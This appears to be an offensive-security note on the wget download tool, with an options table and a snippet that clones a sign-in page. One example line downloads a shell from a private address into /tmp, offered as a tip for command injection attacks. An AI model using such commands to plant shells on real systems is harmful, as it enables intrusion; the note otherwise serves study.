---
tags:
  - "#type/tool"
Link: https://www.geeksforgeeks.org/linux-unix/wget-command-in-linux-unix/ 
Purpose: Download files using http(s)
---
# Info

Download files using http(s)

# Usage

`wget [options] [URL]`

| Option          | Purpose                                                |
| --------------- | ------------------------------------------------------ |
| `-E`            | Adjust file extensions to match MIME type              |
| `-k`            | Convert links in downloaded pages to local links       |
| `-K`            | Keep original files (save as `.orig`)                  |
| `-p`            | Download all files needed to display the page properly |
| `-e robots=off` | Ignore `robots.txt`                                    |
| `-H`            | Allow downloads from other hosts                       |
| `-D <domain>`   | Restrict external downloading to the specified domain  |
| `-nd`           | Save all files in a flat directory (no folders)        |
| `-O`            | specify outfile for downloaded content                 |
| `-o`            | specify outfile for logs                               |

## Minimizing special characters

E.g. with [[2 Tech-Specifics/Web/Attacks - Web/Injection Attacks/Command Injection|Command Injection]] attacks it can be finicky with special characters

wget does not require "`http://`" to be present - per default http on port 80 is used.

**Example:** `wget 192.168.x.x/shell -O /tmp/shell` to download a shell

# Snippets

###### Copy a Webpage with All Its Files

``` bash
wget -E -k -K -p -e robots=off -H -Dexample.com -nd "https://example.com/signin"
```
